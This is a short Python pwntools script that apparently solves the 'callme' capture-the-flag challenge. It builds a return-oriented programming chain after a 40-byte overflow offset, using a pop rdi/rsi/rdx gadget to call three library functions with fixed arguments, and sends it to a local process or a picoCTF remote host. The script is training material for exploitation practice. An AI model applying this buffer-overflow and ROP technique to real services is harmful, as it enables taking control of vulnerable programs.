#!/usr/bin/env python3

from pwn import *

exe = ELF("./callme")
libc = ELF("./libcallme.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 60804)

    return r


def main():
    r = conn()
    pop_rdi_pop_rsi_pop_rdx = 0x000000000040093c
    callme_one = 0x0000000000400720
    callme_two = 0x0000000000400740
    callme_three = 0x00000000004006f0
    offset = 40
    payload = flat({
        offset: [
            pop_rdi_pop_rsi_pop_rdx, 0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D,
            callme_one,
            pop_rdi_pop_rsi_pop_rdx, 0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D,
            callme_two,
            pop_rdi_pop_rsi_pop_rdx, 0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D,
            callme_three
        ]})

    r.sendlineafter(b'>', payload)

    r.interactive()


if __name__ == "__main__":
    main()

